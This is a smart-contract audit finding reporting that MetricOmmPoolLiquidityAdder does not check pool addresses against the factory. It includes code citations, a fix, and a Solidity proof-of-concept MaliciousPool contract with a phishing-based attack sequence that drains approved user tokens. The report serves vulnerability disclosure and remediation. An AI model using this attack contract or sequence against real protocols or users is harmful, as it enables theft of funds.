### Title
Unvalidated Pool Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User Tokens — (File: metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol)

### Summary

`MetricOmmPoolLiquidityAdder` accepts an arbitrary `pool` address from the caller without verifying it against the factory registry. A user who has approved the adder for their tokens can be tricked into calling `addLiquidityExactShares` or `addLiquidityWeighted` with an attacker-controlled pool address. The malicious pool calls back into `metricOmmModifyLiquidityCallback`, passes all caller-set guards, and pulls up to `maxAmountToken0` / `maxAmountToken1` directly from the user's wallet.

### Finding Description

`MetricOmmPoolLiquidityAdder` explicitly documents that it does not validate the pool parameter: [1](#0-0) 

The `addLiquidityExactShares` entry point stores the caller-supplied `pool` address as the *expected* callback caller in transient storage via `_setPayContext`: [2](#0-1) 

`_addLiquidity` stores the attacker-controlled pool as the expected pool and then calls `addLiquidity` on it: [3](#0-2) 

Inside `metricOmmModifyLiquidityCallback`, the only caller check is `msg.sender != expectedPool`. Because `expectedPool` was set to the malicious pool, this check passes. The amount caps are also set by the user's own `maxAmountToken0`/`maxAmountToken1` parameters, which the malicious pool can consume in full: [4](#0-3) 

The `pay` call then executes `safeTransferFrom(payer, msg.sender, amount)` where `payer` is the victim and `msg.sender` is the malicious pool: [5](#0-4) 

Contrast this with `MetricOmmSimpleRouter`, which calls `_requireFactoryPool` on every pool before storing it in transient context: [6](#0-5) [7](#0-6) 

The liquidity adder has no equivalent guard.

### Impact Explanation

Any user who has approved `MetricOmmPoolLiquidityAdder` for token0 and/or token1 (a prerequisite for normal use) can have up to `maxAmountToken0` of token0 and `maxAmountToken1` of token1 transferred directly to the attacker's malicious pool contract. Because the malicious pool controls its own `addLiquidity` implementation, it never actually credits any LP shares; the tokens are simply stolen. This is a direct, complete loss of user principal with no recovery path.

### Likelihood Explanation

The attack requires:
1. The victim has already approved the adder (normal for any LP user).
2. The attacker tricks the victim into calling `addLiquidityExactShares(maliciousPool, ...)` — e.g., via a phishing UI that presents a fake pool address as a legitimate one, or via a malicious frontend that substitutes the pool parameter.

This is the direct analog of the external report: just as a wallet user is tricked into opening a malicious `galleon://` URI that signs attacker-controlled data, a liquidity provider is tricked into calling the adder with an attacker-controlled pool address. The social-engineering surface is real and exploitable because the adder is a shared, approved contract.

### Recommendation

Add a factory registry check inside `_addLiquidity` (or at each public entry point) before storing the pool in transient context, mirroring the pattern already used in `MetricOmmSwapRouterBase`:

```solidity
// In MetricOmmPoolLiquidityAdder._addLiquidity or each public entry point:
if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
```

This requires injecting the factory address at construction time, exactly as `MetricOmmSwapRouterBase` does.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmPoolActions} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {IMetricOmmPool, PoolImmutables} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPool.sol";
import {MetricOmmPoolLiquidityAdder} from "metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol";
import {LiquidityDelta} from "@metric-core/types/PoolOperation.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice Attacker-controlled fake pool
contract MaliciousPool {
    address public immutable token0;
    address public immutable token1;
    address public immutable adder;
    address public immutable attacker;

    constructor(address _token0, address _token1, address _adder, address _attacker) {
        token0 = _token0;
        token1 = _token1;
        adder  = _adder;
        attacker = _attacker;
    }

    // Pool returns fake immutables so the adder can read token addresses
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = token0;
        imm.token1 = token1;
    }

    // Called by the adder; immediately calls back into metricOmmModifyLiquidityCallback
    // with the full max caps, draining the victim
    function addLiquidity(
        address, uint80, LiquidityDelta calldata,
        bytes calldata, bytes calldata
    ) external returns (uint256, uint256) {
        // callbackData must decode to KIND_PAY (== 1)
        MetricOmmPoolLiquidityAdder(payable(adder))
            .metricOmmModifyLiquidityCallback(
                MAX0,   // amount0Delta == victim's max cap
                MAX1,   // amount1Delta == victim's max cap
                abi.encode(uint8(1))  // KIND_PAY
            );
        return (MAX0, MAX1);
    }

    uint256 constant MAX0 = 1_000_000e18;
    uint256 constant MAX1 = 1_000_000e18;
}

// Attack sequence (Foundry test sketch):
// 1. victim approves adder for token0 and token1 (normal LP onboarding)
// 2. attacker deploys MaliciousPool(token0, token1, adder, attacker)
// 3. attacker tricks victim into calling:
//      adder.addLiquidityExactShares(
//          address(maliciousPool),
//          victim,          // owner
//          0,               // salt
//          deltas,
//          1_000_000e18,    // maxAmountToken0
//          1_000_000e18,    // maxAmountToken1
//          ""
//      )
// 4. adder stores maliciousPool as expectedPool, calls maliciousPool.addLiquidity
// 5. maliciousPool calls back metricOmmModifyLiquidityCallback with full caps
// 6. adder checks msg.sender == expectedPool  ✓ (both are maliciousPool)
// 7. adder calls pay(token0, victim, maliciousPool, 1_000_000e18)
//    → safeTransferFrom(victim, maliciousPool, 1_000_000e18)  ← STOLEN
// 8. adder calls pay(token1, victim, maliciousPool, 1_000_000e18)  ← STOLEN
```

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L56-68)
```text
  function addLiquidityExactShares(
    address pool,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);
    _validateDeltas(deltas);
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-178)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }

    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
    _clearPayContext();
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L183-207)
```text
  function _addLiquidity(
    address pool,
    address positionOwner,
    uint80 salt,
    LiquidityDelta memory deltas,
    address payer,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) internal returns (uint256 amount0Added, uint256 amount1Added) {
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
    ) {
      amount0Added = a0;
      amount1Added = a1;
      _clearPayContext();
    } catch (bytes memory reason) {
      _clearPayContext();
      assembly ("memory-safe") {
        revert(add(reason, 32), mload(reason))
      }
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L85-87)
```text
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L29-32)
```text
  function _setNextCallbackContext(address pool, uint8 callbackMode, address payer, address tokenToPay) internal {
    _requireFactoryPool(pool);
    TransientCallbackPool.set(pool, callbackMode, payer, tokenToPay);
  }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L87-89)
```text
  function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert IMetricOmmSimpleRouter.InvalidPool(pool);
  }
```
